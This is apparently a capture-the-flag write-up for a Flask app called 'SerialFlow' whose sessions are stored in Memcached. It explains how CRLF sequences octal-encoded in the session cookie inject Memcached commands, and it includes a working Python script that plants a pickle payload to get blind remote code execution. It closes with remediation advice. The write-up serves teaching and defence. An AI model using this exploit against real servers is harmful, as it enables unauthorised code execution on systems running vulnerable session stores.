# SerialFlow Vulnerability Analysis and Exploitation

## Required Skills

```
1. Understanding of Python and Flask.
2. Basic knowledge of Memcached.
3. Identifying known vulnerabilities.
```

---

## Installed Packages

The following packages are specified in `conf/supervisord.conf`:

```
Flask==2.2.2
Flask-Session==0.4.0
pylibmc==1.6.3
Werkzeug==2.2.2
```

---

## Application Code Overview

### File: `app.py`

#### Key Imports and Configuration

```python
import pylibmc, uuid, sys
from flask import Flask, session, request, redirect, render_template
from flask_session import Session

app = Flask(__name__)

app.secret_key = uuid.uuid4()

app.config["SESSION_TYPE"] = "memcached"
app.config["SESSION_MEMCACHED"] = pylibmc.Client(["127.0.0.1:11211"])
app.config.from_object(__name__)

Session(app)
```

- **Session Storage**: Configured to use Memcached.
- **Key Features**: Flask-Session integrates with Memcached for session management.

#### Request Handling

##### Session Length Enforcement

```python
@app.before_request
def before_request():
    if session.get("session") and len(session["session"]) > 86:
        session["session"] = session["session"][:86]
```

- Trims the `session` to a maximum of 86 characters if it exceeds this length.

##### Error Handling

```python
@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, "description") else [str(x) for x in error.args]

    response = {
        "error": {
            "type": error.__class__.__name__,
            "message": message
        }
    }

    return response, error.code if hasattr(error, "code") else 500
```

- Generates a JSON response with error details.

##### Main Route

```python
@app.route("/")
def main():
    uicolor = session.get("uicolor", "#f1f1f1")
    return render_template("index.html", uicolor=uicolor)
```

- Retrieves `uicolor` from the session and passes it to the template.

##### Set Route

```python
@app.route("/set")
def set():
    uicolor = request.args.get("uicolor")

    if uicolor:
        session["uicolor"] = uicolor

    return redirect("/")
```

- Allows setting the `uicolor` parameter in the session via a query parameter.

---

## Memcached Injection Techniques

### Memcached Overview

Memcached is a distributed memory caching system used for improving application performance by caching frequently accessed data in RAM. In Flask applications, user sessions are often cached in Memcached.

#### Common Memcached Commands

| Command | Format                                                         |
| ------- | -------------------------------------------------------------- |
| `set`   | `set <key> <flags> <expiry> <datalen> [noreply]\r\n<data>\r\n` |
| `get`   | `get <key> [<key>]+\r\n`                                       |

- `<flags>`: Client-side flags (uint32_t).
- `<expiry>`: Expiration time (seconds).
- `<datalen>`: Data size (bytes).
- `<data>`: Data block.

---

## Exploitation Analysis

### Vulnerable Code in Flask-Session

The following function in Flask-Session manages session storage in Memcached:

```python
full_session_key = self.key_prefix + session.sid

if not PY2:
    val = self.serializer.dumps(dict(session), 0)
else:
    val = self.serializer.dumps(dict(session))

self.client.set(full_session_key, val, self._get_memcache_timeout(
                total_seconds(app.permanent_session_lifetime)))
```

#### Observations:

1. The `full_session_key` is constructed using the session ID.
2. The session data is serialized using Python’s `pickle` library before being stored in Memcached.
3. This is vulnerable to Memcached command injection through session cookies.

### HTTP Cookie Encoding

Special characters in HTTP cookies are encoded as per RFC 2068:

| Character | Encoding |
| --------- | -------- |
| `\r`      | `\015`   |
| `\n`      | `\012`   |

This allows injection of CRLF (`\r\n`) sequences into Memcached commands.

---

## Exploitation Steps

### Crafting a Malicious Cookie

The following Python script demonstrates crafting a malicious Memcached payload:

```python
import pickle, os

class RCE:
    def __init__(self, char):
        self.char = char

    def __reduce__(self):
        cmd = ("sleep 10")
        return os.system, (cmd,)

payload = pickle.dumps(RCE(''), 0)
payload_size = len(payload)

cookie = b"1\r\nset injected 0 5 "
cookie += str.encode(str(payload_size))
cookie += str.encode("\r\n")
cookie += payload
cookie += str.encode("\r\n")
cookie += str.encode("get injected")

pack = ""
for x in list(cookie):
    if x > 64:
        pack += oct(x).replace("0o", "\\")
    elif x < 8:
        pack += oct(x).replace("0o", "\\00")
    else:
        pack += oct(x).replace("0o", "\\0")

final = f"\"{pack}\""
print(final)
```

#### Key Components

1. **`__reduce__` Method**: Allows arbitrary command execution during deserialization.
2. **CRLF Injection**: Encodes CRLF as `\015\012` to inject Memcached commands.
3. **Payload Composition**: Constructs a malicious session cookie containing:
   - `set` command to inject payload.
   - `get` command to trigger deserialization.

### Blind RCE

The example payload executes `sleep 10` on the server, demonstrating a successful Remote Code Execution (RCE).

---

## Lessons Learned

1. **Serialization Risks**: Using Python’s `pickle` library for session storage is inherently unsafe.
2. **Memcached Command Injection**: Proper input validation and sanitization are critical.
3. **Cookie Management**: Encoded characters in cookies can bypass filters and exploit vulnerabilities.

---

## Recommendations

1. **Avoid `pickle` for Session Serialization**:
   
   - Use secure libraries like `json` for serialization.

2. **Sanitize User Input**:
   
   - Validate session IDs and other inputs to prevent injection.

3. **Implement Strong Access Controls**:
   
   - Restrict Memcached access to trusted clients only.

4. **Monitor Session Behavior**:
   
   - Detect and mitigate abnormal session activity indicative of exploitation.

![Image](/home/busik/Pictures/Screenshots/Screenshot%20from%202024-12-08%2016-20-26.png)
